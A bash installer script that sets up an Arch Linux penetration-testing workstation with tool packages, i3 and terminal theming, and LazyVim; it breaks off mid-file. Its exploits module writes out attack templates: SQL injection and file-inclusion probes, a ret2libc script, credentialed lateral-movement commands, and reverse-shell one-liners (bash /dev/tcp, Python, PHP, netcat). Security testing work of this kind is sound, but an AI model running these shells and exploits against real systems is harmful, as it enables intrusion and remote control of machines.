#!/usr/bin/env bash

# - Interactive CLI by default, --auto for unattended
# - Modules installed in correct dependency order automatically
# - HTB-inspired Neon Nord theme (green #9fef00 + Nord palette)
# - Package validation and integrity checks
#
# Usage examples:
#   ./skidstall.sh               # interactive CLI
#   ./skidstall.sh --auto --modules ui,pentest,lazyvim
#   ./skidstall.sh --update --modules pentest

set -euo pipefail
IFS=$'\n\t'

# Colors for output
GREEN='\033[0;32m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Installation tracking
INSTALL_LOG="/tmp/skidstall-$$.log"
FAILED_PACKAGES=()
SUCCESSFUL_PACKAGES=()

# ------------------ Banner ------------------
show_banner(){
  echo -e "${CYAN}"
  cat << 'EOF'
╔═══════════════════════════════════════════════════════════╗
║   🎨 NEON NORD PENTEST - Skidstall Installer 🎨          ║
║   HackTheBox Green (#9fef00) + Nord Dark                 ║
║   Modular • VM-Optimized • Dependency-Resolved           ║
╚═══════════════════════════════════════════════════════════╝
EOF
  echo -e "${NC}"
}

# ------------------ Configuration ------------------
# Core dependencies - must be installed first
PACMAN_CORE=(
  base-devel git curl wget sudo
)

# Dev tools - needed before pentest (provides Python, pipx, etc)
PACMAN_DEV=(
  python python-pip python-setuptools python-wheel
  python-virtualenv python-pipx
  go rust cargo nodejs npm 
  jq yq fd ripgrep
  neovim tmux screen
)

# UI packages - needs fonts and base X
PACMAN_UI=(
  xorg xorg-xinit i3-wm i3status i3lock
  feh rofi thunar kitty 
  maim xclip dunst btop firefox
  picom
  gtk3 gtk4
  ttf-fira-code ttf-jetbrains-mono-nerd ttf-font-awesome
  papirus-icon-theme
)

# UI packages that may need AUR
AUR_UI=(
  polybar
)

# Optional UI (try AUR if not in repos)
OPTIONAL_UI=(
  nitrogen i3-gaps
)

# Pentest tools - depends on python being installed
PACMAN_PENTEST=(
  nmap masscan wireshark-qt 
  john hashcat sqlmap gobuster nikto
  aircrack-ng hydra openbsd-netcat openvpn 
  smbclient cifs-utils
  bind tcpdump net-tools iproute2
  exploitdb proxychains-ng socat
  radare2 strace ltrace gdb 
  binwalk foremost exiftool
  metasploit
)

# Pentest packages that moved to AUR
AUR_PENTEST=(
  burpsuite feroxbuster rustscan 
  chisel 
  seclists ffuf
)

# Optional pentest tools (may fail)
AUR_PENTEST_OPTIONAL=(
  kerbrute-bin
  nuclei subfinder httpx-toolkit 
  waybackurls gau gospider
  enum4linux
)

# Networking tools
PACMAN_NETWORKING=(
  openssh iperf3 traceroute ufw inetutils
)

# Docker
PACMAN_DOCKER=(
  docker docker-compose docker-buildx
)

# VMware tools
PACMAN_VMTOOLS=(
  open-vm-tools gtkmm3 xf86-input-vmmouse xf86-video-vmware
)

# VPN tools
PACMAN_VPN=(
  openvpn wireguard-tools 
  networkmanager networkmanager-openvpn
)

# Optional AUR (may fail, non-critical)
AUR_OPTIONAL=(
  zaproxy ligolo-ng katana hakrawler
)

# Python tools via pipx (installed AFTER pipx is available)
PIPX_TOOLS=(
  impacket bloodhound mitm6 dnstwist
)

# Python tools via pip --user (installed AFTER python-pip)
PIP_USER_TOOLS=(
  pwntools ropper ropgadget 
  pycryptodome paramiko requests scapy
)

# Module execution order - CRITICAL FOR DEPENDENCIES
MODULE_EXECUTION_ORDER=(
  core      # System update, base-devel, git
  dev       # Python, pip, pipx, compilers
  vmtools   # VMware tools (can run early)
  networking # Network utilities
  ui        # X server, i3, fonts (needs base-devel for AUR)
  pentest   # Pentest tools (needs python, pip)
  lazyvim   # Neovim config (needs neovim from dev)
  exploits  # Exploit templates (needs directories)
  workflow  # Workspace automation
  theming   # Final theme polish
  docker    # Docker (independent)
  vpn       # VPN tools (independent)
)

# User-selectable modules (same as execution order)
AVAILABLE_MODULES=("${MODULE_EXECUTION_ORDER[@]}")

# ------------------ Helpers ------------------
log() { echo -e "${GREEN}[+]${NC} $*" | tee -a "$INSTALL_LOG"; }
warn() { echo -e "${YELLOW}[!]${NC} $*" | tee -a "$INSTALL_LOG"; }
err() { echo -e "${RED}[✗]${NC} $*" | tee -a "$INSTALL_LOG" >&2; }
info() { echo -e "${CYAN}[i]${NC} $*" | tee -a "$INSTALL_LOG"; }

confirm() {
  local prompt="$1"
  read -r -p "$prompt [y/N]: " ans
  [[ "$ans" =~ ^([yY][eE][sS]|[yY])$ ]]
}

# Package availability check with timeout
check_pacman_package() {
  local pkg="$1"
  timeout 5 pacman -Si "$pkg" &>/dev/null
}

check_aur_package() {
  local pkg="$1"
  # Check if package exists in AUR with timeout
  timeout 10 curl -s "https://aur.archlinux.org/rpc/?v=5&type=info&arg=${pkg}" 2>/dev/null | grep -q '"resultcount":1'
}

is_package_installed() {
  local pkg="$1"
  pacman -Qi "$pkg" &>/dev/null || yay -Qi "$pkg" &>/dev/null 2>&1
}

ensure_sudo() {
  if ! command -v sudo &>/dev/null; then
    err "sudo is required. Install it first."
    exit 1
  fi
  # Test sudo access
  if ! sudo -v; then
    err "sudo access required. Add your user to wheel group."
    exit 1
  fi
}

ensure_yay() {
  if command -v yay &>/dev/null; then
    return 0
  fi
  
  log "Installing yay AUR helper..."
  local tmpdir="/tmp/yay-install-$$"
  mkdir -p "$tmpdir"
  cd "$tmpdir"
  
  info "Cloning yay repository (this may take a moment)..."
  if ! timeout 120 git clone --depth=1 https://aur.archlinux.org/yay.git 2>&1 | tee -a "$INSTALL_LOG"; then
    err "Failed to clone yay repository (timeout or network error)"
    cd - >/dev/null
    return 1
  fi
  
  cd yay
  info "Building yay..."
  if ! timeout 300 makepkg -si --noconfirm 2>&1 | tee -a "$INSTALL_LOG"; then
    err "Failed to build yay"
    cd - >/dev/null
    return 1
  fi
  
  cd - >/dev/null
  rm -rf "$tmpdir"
  log "yay installed successfully"
}

ensure_pipx() {
  if command -v pipx &>/dev/null; then
    return 0
  fi
  
  log "Installing pipx..."
  if ! python -m pip install --user pipx; then
    err "Failed to install pipx"
    return 1
  fi
  
  python -m pipx ensurepath || true
  export PATH="$HOME/.local/bin:$PATH"
  
  # Verify pipx is available
  if ! command -v pipx &>/dev/null; then
    warn "pipx installed but not in PATH. Add ~/.local/bin to PATH"
  fi
}

# Enhanced package installation with validation
install_pacman_pkgs(){
  local pkgs=("$@")
  if [ ${#pkgs[@]} -eq 0 ]; then return 0; fi
  
  log "Validating ${#pkgs[@]} packages before installation..."
  
  local valid_pkgs=()
  local invalid_pkgs=()
  local already_installed=()
  
  # Validate each package
  for pkg in "${pkgs[@]}"; do
    if is_package_installed "$pkg"; then
      already_installed+=("$pkg")
      info "  ✓ $pkg (already installed)"
      SUCCESSFUL_PACKAGES+=("$pkg")
    elif check_pacman_package "$pkg"; then
      valid_pkgs+=("$pkg")
      info "  ✓ $pkg (available)"
    else
      invalid_pkgs+=("$pkg")
      warn "  ✗ $pkg (not in repos or timeout)"
      FAILED_PACKAGES+=("$pkg")
    fi
  done
  
  # Install valid packages
  if [ ${#valid_pkgs[@]} -gt 0 ]; then
    log "Installing ${#valid_pkgs[@]} validated packages..."
    if sudo pacman -S --noconfirm --needed "${valid_pkgs[@]}" 2>&1 | tee -a "$INSTALL_LOG"; then
      SUCCESSFUL_PACKAGES+=("${valid_pkgs[@]}")
      log "Successfully installed ${#valid_pkgs[@]} packages"
    else
      warn "Some packages failed during installation"
      # Try to identify which ones failed
      for pkg in "${valid_pkgs[@]}"; do
        if ! is_package_installed "$pkg"; then
          FAILED_PACKAGES+=("$pkg")
        fi
      done
    fi
  fi
  
  # Report on invalid packages
  if [ ${#invalid_pkgs[@]} -gt 0 ]; then
    warn "The following packages are not available in repos:"
    for pkg in "${invalid_pkgs[@]}"; do
      echo "    - $pkg"
    done
    warn "These will be attempted via AUR if available"
  fi
  
  return 0
}

install_aur_pkgs(){
  local pkgs=("$@")
  if [ ${#pkgs[@]} -eq 0 ]; then return 0; fi
  
  ensure_yay || return 1
  
  log "Installing ${#pkgs[@]} packages from AUR..."
  
  # Install individually to avoid one failure breaking all
  for pkg in "${pkgs[@]}"; do
    if is_package_installed "$pkg"; then
      info "  ✓ $pkg already installed (skipping)"
      SUCCESSFUL_PACKAGES+=("$pkg")
      continue
    fi
    
    # Check if package exists in AUR
    info "  Checking $pkg availability in AUR..."
    if ! check_aur_package "$pkg"; then
      warn "  ✗ $pkg not found in AUR (skipping)"
      FAILED_PACKAGES+=("$pkg")
      continue
    fi
    
    info "  Installing $pkg from AUR (this may take several minutes)..."
    # Use timeout to prevent infinite hangs
    if timeout 600 yay -S --noconfirm --needed "$pkg" 2>&1 | tee -a "$INSTALL_LOG"; then
      if is_package_installed "$pkg"; then
        log "  ✓ $pkg installed successfully"
        SUCCESSFUL_PACKAGES+=("$pkg")
      else
        warn "  ✗ $pkg installation reported success but package not found"
        FAILED_PACKAGES+=("$pkg")
      fi
    else
      warn "  ✗ Failed to install $pkg from AUR (timeout or error)"
      FAILED_PACKAGES+=("$pkg")
    fi
  done
}

install_optional_pkgs(){
  local pkgs=("$@")
  if [ ${#pkgs[@]} -eq 0 ]; then return 0; fi
  
  info "Installing ${#pkgs[@]} optional packages (non-critical)..."
  
  for pkg in "${pkgs[@]}"; do
    if is_package_installed "$pkg"; then
      info "  ✓ $pkg already installed"
      continue
    fi
    
    # Try pacman first
    if check_pacman_package "$pkg"; then
      info "  Trying $pkg from official repos..."
      if timeout 120 sudo pacman -S --noconfirm --needed "$pkg" 2>/dev/null; then
        log "  ✓ $pkg installed"
        SUCCESSFUL_PACKAGES+=("$pkg")
        continue
      fi
    fi
    
    # Try AUR if pacman failed
    if command -v yay &>/dev/null; then
      info "  Trying $pkg from AUR..."
      if timeout 600 yay -S --noconfirm --needed "$pkg" 2>/dev/null; then
        log "  ✓ $pkg installed from AUR"
        SUCCESSFUL_PACKAGES+=("$pkg")
      else
        warn "  ✗ $pkg unavailable (optional, skipped)"
      fi
    else
      warn "  ✗ $pkg skipped (yay not available)"
    fi
  done
}

install_pipx_tools(){
  local tools=("$@")
  if [ ${#tools[@]} -eq 0 ]; then return 0; fi
  
  ensure_pipx || return 1
  
  for tool in "${tools[@]}"; do
    if pipx list 2>/dev/null | grep -q "package $tool"; then
      info "  ✓ $tool already installed via pipx"
      SUCCESSFUL_PACKAGES+=("pipx:$tool")
      continue
    fi
    
    log "  Installing $tool via pipx..."
    if timeout 300 pipx install "$tool" 2>&1 | tee -a "$INSTALL_LOG"; then
      log "  ✓ $tool installed"
      SUCCESSFUL_PACKAGES+=("pipx:$tool")
    else
      warn "  ✗ Failed to install $tool via pipx"
      FAILED_PACKAGES+=("pipx:$tool")
    fi
  done
}

install_pip_user_tools(){
  local tools=("$@")
  if [ ${#tools[@]} -eq 0 ]; then return 0; fi
  
  log "Installing ${#tools[@]} Python packages via pip --user..."
  
  for tool in "${tools[@]}"; do
    info "  Installing $tool..."
    if timeout 180 python -m pip install --user "$tool" 2>&1 | tee -a "$INSTALL_LOG"; then
      log "  ✓ $tool installed"
      SUCCESSFUL_PACKAGES+=("pip:$tool")
    else
      warn "  ✗ Failed: $tool"
      FAILED_PACKAGES+=("pip:$tool")
    fi
  done
}

# Show installation summary
show_install_summary(){
  echo ""
  echo -e "${CYAN}╔════════════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║           Installation Summary                     ║${NC}"
  echo -e "${CYAN}╚════════════════════════════════════════════════════╝${NC}"
  echo ""
  
  if [ ${#SUCCESSFUL_PACKAGES[@]} -gt 0 ]; then
    log "Successfully installed: ${#SUCCESSFUL_PACKAGES[@]} packages"
  fi
  
  if [ ${#FAILED_PACKAGES[@]} -gt 0 ]; then
    warn "Failed packages: ${#FAILED_PACKAGES[@]}"
    echo ""
    echo "The following packages failed to install:"
    for pkg in "${FAILED_PACKAGES[@]}"; do
      echo "  - $pkg"
    done
    echo ""
    warn "Some functionality may be limited"
  else
    log "All packages installed successfully!"
  fi
  
  info "Full log available at: $INSTALL_LOG"
}

# ------------------ Module Implementations ------------------

module_core(){
  log "[core] System update and base packages..."
  ensure_sudo
  
  info "Updating package databases..."
  sudo pacman -Sy --noconfirm 2>&1 | tee -a "$INSTALL_LOG"
  
  info "Upgrading system..."
  sudo pacman -Syu --noconfirm 2>&1 | tee -a "$INSTALL_LOG"
  
  info "Installing core packages..."
  install_pacman_pkgs "${PACMAN_CORE[@]}"
  
  # Create ~/.local/bin
  mkdir -p ~/.local/bin
  
  # Add to PATH if not present
  if ! grep -q '.local/bin' ~/.bashrc 2>/dev/null; then
    echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
    export PATH="$HOME/.local/bin:$PATH"
  fi
  
  log "[core] Done."
}

module_dev(){
  log "[dev] Installing development tools..."
  
  # Install Python and tools first
  install_pacman_pkgs "${PACMAN_DEV[@]}"
  
  # Ensure pipx is installed and working
  ensure_pipx
  
  log "[dev] Done."
}

module_vmtools(){
  log "[vmtools] Installing VMware guest tools..."
  
  install_pacman_pkgs "${PACMAN_VMTOOLS[@]}"
  
  info "Enabling vmtoolsd service..."
  sudo systemctl enable vmtoolsd 2>/dev/null || warn "Could not enable vmtoolsd"
  sudo systemctl start vmtoolsd 2>/dev/null || warn "Could not start vmtoolsd"
  
  log "[vmtools] Done."
}

module_networking(){
  log "[networking] Installing network utilities..."
  
  install_pacman_pkgs "${PACMAN_NETWORKING[@]}"
  
  info "SSH server NOT enabled by default (security)"
  info "To enable: sudo systemctl enable --now sshd"
  
  log "[networking] Done."
}

module_ui(){
  log "[ui] Installing UI with HTB Neon Nord theme..."
  
  # Install base UI packages from official repos
  install_pacman_pkgs "${PACMAN_UI[@]}"
  
  # Install UI packages from AUR
  install_aur_pkgs "${AUR_UI[@]}"
  
  # Install optional UI packages
  install_optional_pkgs "${OPTIONAL_UI[@]}"
  
  # Download HTB-style wallpaper
  info "Downloading Nord wallpaper..."
  mkdir -p ~/Pictures
  if timeout 30 curl -fsSL "https://raw.githubusercontent.com/linuxdotexe/nordic-wallpapers/master/wallpapers/nord-neon-mountains.png" \
       -o ~/Pictures/wallpaper.jpg 2>/dev/null; then
    log "Wallpaper downloaded"
  else
    warn "Wallpaper download failed (will use feh default)"
  fi
  
  # Create .xinitrc
  cat > ~/.xinitrc << 'EOF'
#!/bin/sh
exec i3
EOF
  chmod +x ~/.xinitrc
  
  # i3 config with HTB green accent
  mkdir -p ~/.config/i3
  cat > ~/.config/i3/config << 'EOF'
# Neon Nord Pentest i3 Config
set $mod Mod4
font pango:JetBrainsMono Nerd Font 10

# HTB Neon Nord Colors
set $bg-dark     #2e3440
set $bg-medium   #3b4252
set $bg-light    #434c5e
set $fg          #eceff4
set $htb-green   #9fef00
set $accent-cyan #88c0d0
set $accent-purp #b48ead
set $urgent      #bf616a

# Window colors (HTB green borders on focused)
client.focused           $htb-green     $bg-dark       $fg       $accent-cyan   $htb-green
client.focused_inactive  $bg-light      $bg-dark       $fg       $bg-light      $bg-light
client.unfocused         $bg-medium     $bg-dark       $fg       $bg-medium     $bg-medium
client.urgent            $urgent        $urgent        $fg       $urgent        $urgent

gaps inner 10
gaps outer 5
smart_gaps on

for_window [class=".*"] border pixel 2
default_border pixel 2
default_floating_border pixel 2
for_window [class=".*"] title_format " "

# Autostart
exec_always --no-startup-id ~/.config/polybar/launch.sh
exec_always --no-startup-id feh --bg-scale ~/Pictures/wallpaper.jpg || feh --bg-fill /usr/share/backgrounds/*
exec --no-startup-id dunst

# Keybindings
bindsym $mod+d exec --no-startup-id rofi -show drun
bindsym $mod+Return exec kitty
bindsym $mod+Shift+q kill

# Navigation (vim keys)
bindsym $mod+h focus left
bindsym $mod+j focus down
bindsym $mod+k focus up
bindsym $mod+l focus right

bindsym $mod+Shift+h move left
bindsym $mod+Shift+j move down
bindsym $mod+Shift+k move up
bindsym $mod+Shift+l move right

# Splits
bindsym $mod+b split h
bindsym $mod+v split v
bindsym $mod+f fullscreen toggle

# Layouts
bindsym $mod+s layout stacking
bindsym $mod+w layout tabbed
bindsym $mod+e layout toggle split

# Float
bindsym $mod+Shift+space floating toggle
bindsym $mod+space focus mode_toggle

# Workspaces (pentest workflow)
set $ws1 "1:recon"
set $ws2 "2:enum"
set $ws3 "3:exploit"
set $ws4 "4:post"
set $ws5 "5:notes"

bindsym $mod+1 workspace $ws1
bindsym $mod+2 workspace $ws2
bindsym $mod+3 workspace $ws3
bindsym $mod+4 workspace $ws4
bindsym $mod+5 workspace $ws5

bindsym $mod+Shift+1 move container to workspace $ws1
bindsym $mod+Shift+2 move container to workspace $ws2
bindsym $mod+Shift+3 move container to workspace $ws3
bindsym $mod+Shift+4 move container to workspace $ws4
bindsym $mod+Shift+5 move container to workspace $ws5

# System
bindsym $mod+Shift+c reload
bindsym $mod+Shift+r restart
bindsym Print exec --no-startup-id maim -s | xclip -selection clipboard -t image/png
bindsym $mod+Shift+x exec i3lock -c 2e3440

# Resize mode
mode "resize" {
    bindsym h resize shrink width 10 px
    bindsym j resize grow height 10 px
    bindsym k resize shrink height 10 px
    bindsym l resize grow width 10 px
    bindsym Return mode "default"
    bindsym Escape mode "default"
}
bindsym $mod+r mode "resize"

# Floating windows
for_window [class="Thunar"] floating enable
for_window [class="Pavucontrol"] floating enable
for_window [title="nmtui"] floating enable
for_window [class="floating-term"] floating enable, resize set 1200 700, move position center

# Auto-assign to workspaces
assign [class="Burp"] $ws3
assign [class="Wireshark"] $ws2
EOF
  
  # Picom config
  mkdir -p ~/.config/picom
  cat > ~/.config/picom/picom.conf << 'EOF'
# VM-friendly picom config
backend = "xrender";
vsync = true;
use-damage = true;

shadow = true;
shadow-radius = 12;
shadow-opacity = 0.6;
shadow-offset-x = -8;
shadow-offset-y = -8;

fading = true;
fade-in-step = 0.03;
fade-out-step = 0.03;

inactive-opacity = 0.92;
frame-opacity = 0.9;

corner-radius = 8;
rounded-corners-exclude = [
    "window_type = 'dock'",
    "window_type = 'desktop'"
];

wintypes:
{
    tooltip = { fade = true; shadow = true; opacity = 0.95; };
    dock = { shadow = false; };
};
EOF
  
  # Polybar config
  mkdir -p ~/.config/polybar
  cat > ~/.config/polybar/config.ini << 'EOF'
[colors]
background = #2e3440
background-alt = #3b4252
foreground = #eceff4
primary = #9fef00
secondary = #88c0d0
alert = #bf616a
disabled = #4c566a

[bar/main]
width = 100%
height = 28
background = ${colors.background}
foreground = ${colors.foreground}
line-size = 3
padding = 1
module-margin = 1
separator = |
separator-foreground = ${colors.disabled}
font-0 = JetBrainsMono Nerd Font:size=10;2
font-1 = Font Awesome 6 Free:style=Solid:size=10;2
modules-left = xworkspaces xwindow
modules-right = filesystem memory cpu date
cursor-click = pointer

[module/xworkspaces]
type = internal/xworkspaces
label-active = %name%
label-active-background = ${colors.background-alt}
label-active-underline= ${colors.primary}
label-active-padding = 1
label-occupied = %name%
label-occupied-padding = 1
label-urgent = %name%
label-urgent-background = ${colors.alert}
label-urgent-padding = 1
label-empty = %name%
label-empty-foreground = ${colors.disabled}
label-empty-padding = 1

[module/xwindow]
type = internal/xwindow
label = %title:0:60:...%

[module/filesystem]
type = internal/fs
mount-0 = /
label-mounted = %{F#9fef00}%mountpoint%%{F-} %percentage_used%%

[module/memory]
type = internal/memory
interval = 2
format-prefix = "RAM "
format-prefix-foreground = ${colors.primary}
label = %percentage_used:2%%

[module/cpu]
type = internal/cpu
interval = 2
format-prefix = "CPU "
format-prefix-foreground = ${colors.primary}
label = %percentage:2%%

[module/date]
type = internal/date
interval = 1
date = %H:%M
date-alt = %Y-%m-%d %H:%M:%S
label = %date%
label-foreground = ${colors.primary}
EOF
  
  cat > ~/.config/polybar/launch.sh << 'EOF'
#!/bin/bash
killall -q polybar
while pgrep -u $UID -x polybar >/dev/null; do sleep 0.5; done
polybar main 2>&1 | tee -a /tmp/polybar.log & disown
EOF
  chmod +x ~/.config/polybar/launch.sh
  
  # Kitty config
  mkdir -p ~/.config/kitty
  cat > ~/.config/kitty/kitty.conf << 'EOF'
# HTB Neon Nord Kitty Theme
font_family      JetBrainsMono Nerd Font
font_size 11.0
cursor_shape block
cursor_blink_interval 0

background_opacity 0.92
background_blur 20

foreground            #eceff4
background            #2e3440
selection_foreground  #2e3440
selection_background  #9fef00

color0   #3b4252
color8   #4c566a
color1   #bf616a
color9   #bf616a
color2   #9fef00
color10  #9fef00
color3   #ebcb8b
color11  #ebcb8b
color4   #81a1c1
color12  #81a1c1
color5   #b48ead
color13  #b48ead
color6   #88c0d0
color14  #8fbcbb
color7   #e5e9f0
color15  #eceff4

tab_bar_style powerline
active_tab_foreground   #2e3440
active_tab_background   #9fef00
inactive_tab_foreground #d8dee9
inactive_tab_background #3b4252

window_padding_width 10
EOF
  
  # Rofi theme
  mkdir -p ~/.config/rofi
  cat > ~/.config/rofi/config.rasi << 'EOF'
configuration {
    modi: "drun,run,window";
    show-icons: true;
    display-drun: "Apps";
    display-run: "Run";
    display-window: "Windows";
}

@theme "neon-nord"
EOF
  
  cat > ~/.config/rofi/neon-nord.rasi << 'EOF'
* {
    bg: #2e3440;
    bg-alt: #3b4252;
    fg: #eceff4;
    primary: #9fef00;
    
    background-color: @bg;
    text-color: @fg;
    margin: 0;
    padding: 0;
    spacing: 0;
}

window {
    width: 600px;
    border: 2px;
    border-color: @primary;
    border-radius: 8px;
}

inputbar {
    padding: 12px;
    spacing: 12px;
    children: [prompt, entry];
}

prompt {
    text-color: @primary;
}

entry {
    placeholder: "Search...";
}

listview {
    padding: 8px 0;
    lines: 8;
}

element {
    padding: 8px 12px;
    spacing: 8px;
}

element selected {
    background-color: @bg-alt;
    text-color: @primary;
}

element-icon {
    size: 1em;
}
EOF
  
  # Dunst config
  mkdir -p ~/.config/dunst
  cat > ~/.config/dunst/dunstrc << 'EOF'
[global]
    font = JetBrainsMono Nerd Font 10
    markup = full
    format = "<b>%s</b>\n%b"
    alignment = left
    show_age_threshold = 60
    word_wrap = yes
    width = 300
    height = 300
    offset = 10x30
    padding = 8
    horizontal_padding = 8
    frame_width = 2
    
[urgency_low]
    background = "#2e3440"
    foreground = "#eceff4"
    frame_color = "#88c0d0"
    timeout = 5

[urgency_normal]
    background = "#2e3440"
    foreground = "#eceff4"
    frame_color = "#9fef00"
    timeout = 10

[urgency_critical]
    background = "#2e3440"
    foreground = "#eceff4"
    frame_color = "#bf616a"
    timeout = 0
EOF
  
  # Tmux config
  cat > ~/.tmux.conf << 'EOF'
# Neon Nord tmux
set -g default-terminal "screen-256color"
set -g status-bg "#2e3440"
set -g status-fg "#eceff4"
set -g status-left "#[fg=#9fef00,bold] #S "
set -g status-right "#[fg=#88c0d0] %H:%M #[fg=#9fef00] %d-%b-%y "
set -g window-status-current-format "#[fg=#2e3440,bg=#9fef00,bold] #I:#W "
set -g window-status-format "#[fg=#d8dee9] #I:#W "
set -g pane-border-style "fg=#434c5e"
set -g pane-active-border-style "fg=#9fef00"
set -g mouse on
bind | split-window -h
bind - split-window -v
EOF
  
  log "[ui] Done. Theme: HTB Neon Nord (#9fef00)"
  info "Start X with: startx"
}

module_pentest(){
  log "[pentest] Installing pentesting tools..."
  
  # Install pacman packages
  install_pacman_pkgs "${PACMAN_PENTEST[@]}"
  
  # Install AUR packages
  install_aur_pkgs "${AUR_PENTEST[@]}"
  
  # Optional AUR packages
  info "Installing optional AUR tools (may take time)..."
  install_optional_pkgs "${AUR_PENTEST_OPTIONAL[@]}"
  install_optional_pkgs "${AUR_OPTIONAL[@]}"
  
  # Install pipx tools
  install_pipx_tools "${PIPX_TOOLS[@]}"
  
  # Install pip user tools
  install_pip_user_tools "${PIP_USER_TOOLS[@]}"
  
  # Setup Metasploit database
  info "Initializing Metasploit database..."
  if command -v msfdb &>/dev/null; then
    timeout 120 msfdb init 2>&1 | tee -a "$INSTALL_LOG" || warn "msfdb init failed (non-critical)"
  fi
  
  log "[pentest] Done."
}

module_lazyvim(){
  log "[lazyvim] Installing LazyVim with Nord theme..."
  
  # Backup existing nvim config
  if [ -d ~/.config/nvim ]; then
    warn "Backing up existing nvim config..."
    mv ~/.config/nvim ~/.config/nvim.backup."$(date +%Y%m%d_%H%M%S)"
  fi
  if [ -d ~/.local/share/nvim ]; then
    mv ~/.local/share/nvim ~/.local/share/nvim.backup."$(date +%Y%m%d_%H%M%S)"
  fi
  
  # Clone LazyVim starter
  info "Cloning LazyVim starter..."
  timeout 60 git clone --depth=1 https://github.com/LazyVim/starter ~/.config/nvim
  rm -rf ~/.config/nvim/.git
  
  # Create custom config
  mkdir -p ~/.config/nvim/lua/{config,plugins}
  
  # Nord colorscheme
  cat > ~/.config/nvim/lua/plugins/colorscheme.lua << 'EOF'
return {
  {
    "shaunsingh/nord.nvim",
    lazy = false,
    priority = 1000,
    config = function()
      vim.g.nord_contrast = true
      vim.g.nord_borders = false
      vim.g.nord_disable_background = true
      require('nord').set()
    end,
  },
  {
    "LazyVim/LazyVim",
    opts = {
      colorscheme = "nord",
    },
  },
}
EOF
  
  # Custom keymaps
  cat > ~/.config/nvim/lua/config/keymaps.lua << 'EOF'
local map = vim.keymap.set

-- Pentest shortcuts
map("n", "<leader>ps", ":vs ~/pentest/<CR>", { desc = "Open pentest dir" })
map("n", "<leader>pn", ":e notes/", { desc = "New note" })
map("n", "<leader>fe", ":Telescope find_files cwd=~/exploits<CR>", { desc = "Find exploits" })
map("n", "<leader>fn", ":Telescope find_files cwd=~/pentest<CR>", { desc = "Find notes" })

-- Terminal
map("n", "<leader>pt", ":terminal<CR>", { desc = "Terminal" })
map("t", "<C-x>", "<C-\\><C-n>", { desc = "Exit terminal mode" })
EOF
  
  # Options
  cat > ~/.config/nvim/lua/config/options.lua << 'EOF'
vim.g.mapleader = " "
vim.opt.number = true
vim.opt.relativenumber = true
vim.opt.mouse = "a"
vim.opt.ignorecase = true
vim.opt.smartcase = true
vim.opt.hlsearch = false
vim.opt.wrap = false
vim.opt.tabstop = 4
vim.opt.shiftwidth = 4
vim.opt.expandtab = true
vim.opt.termguicolors = true
vim.opt.clipboard = "unnamedplus"
vim.opt.conceallevel = 0
EOF
  
  log "[lazyvim] Done. LazyVim will install plugins on first run."
}

module_exploits(){
  log "[exploits] Creating exploit templates..."
  
  mkdir -p ~/exploits/{web,binary,windows,linux,scripts}
  
  # Web SQLi template
  cat > ~/exploits/web/sqli_union.py << 'EOFPY'
#!/usr/bin/env python3
"""SQLi Union-based - Template"""
import requests

TARGET = "http://TARGET/page.php"
PARAM = "id"

def test_columns():
    for i in range(1, 20):
        payload = f"1' ORDER BY {i}-- -"
        r = requests.get(TARGET, params={PARAM: payload})
        if "error" in r.text.lower():
            return i-1
    return None

if __name__ == "__main__":
    print("[*] Testing columns...")
    cols = test_columns()
    if cols:
        print(f"[+] Columns: {cols}")
EOFPY
  chmod +x ~/exploits/web/sqli_union.py
  
  # LFI template
  cat > ~/exploits/web/lfi_wrapper.py << 'EOFPY'
#!/usr/bin/env python3
"""LFI with PHP wrappers"""
import requests
import base64

TARGET = "http://TARGET/page.php"
PARAM = "file"

payloads = [
    "php://filter/convert.base64-encode/resource=index.php",
    "../../../../etc/passwd",
]

for p in payloads:
    print(f"[*] {p}")
    r = requests.get(TARGET, params={PARAM: p})
    print(r.text[:200])
EOFPY
  chmod +x ~/exploits/web/lfi_wrapper.py
  
  # Binary ret2libc
  cat > ~/exploits/binary/ret2libc.py << 'EOFPY'
#!/usr/bin/env python3
"""Ret2libc template"""
from pwn import *

context.binary = elf = ELF('./vuln')
# io = process('./vuln')
io = remote('target', 1337)

offset = 64  # Find with pattern_create

# Leak libc
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()

payload = flat([b'A' * offset, rop.chain()])
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked: {hex(leak)}")

io.interactive()
EOFPY
  chmod +x ~/exploits/binary/ret2libc.py
  
  # Windows lateral movement
  cat > ~/exploits/windows/lateral_movement.sh << 'EOFSH'
#!/bin/bash
# Lateral movement techniques

TARGET="192.168.1.100"
USER="administrator"
PASS="password"

echo "[*] PSExec"
psexec.py $USER:$PASS@$TARGET

echo "[*] WMIExec"
wmiexec.py $USER:$PASS@$TARGET

echo "[*] SMBExec"
smbexec.py $USER:$PASS@$TARGET
EOFSH
  chmod +x ~/exploits/windows/lateral_movement.sh
  
  # Linux privesc checks
  cat > ~/exploits/linux/privesc_checks.sh << 'EOFSH'
#!/bin/bash
# Linux privilege escalation enumeration

echo "[*] SUID Binaries"
find / -perm -4000 -type f 2>/dev/null

echo "[*] Sudo permissions"
sudo -l 2>/dev/null

echo "[*] Cron jobs"
cat /etc/crontab

echo "[*] Capabilities"
getcap -r / 2>/dev/null

echo "[*] Writable /etc/passwd?"
test -w /etc/passwd && echo "YES!" || echo "No"
EOFSH
  chmod +x ~/exploits/linux/privesc_checks.sh
  
  # Reverse shell generator
  cat > ~/exploits/scripts/reverse_shell_generator.sh << 'EOFSH'
#!/bin/bash
# Reverse shell generator

LHOST="${1:-10.10.14.1}"
LPORT="${2:-4444}"

echo "=== Reverse Shells ==="
echo "LHOST: $LHOST | LPORT: $LPORT"
echo ""

echo "[Bash]"
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""

echo "[Python]"
echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
echo ""

echo "[PHP]"
echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
echo ""

echo "[Netcat]"
echo "nc -e /bin/bash $LHOST $LPORT"
echo ""

echo "[PowerShell]"
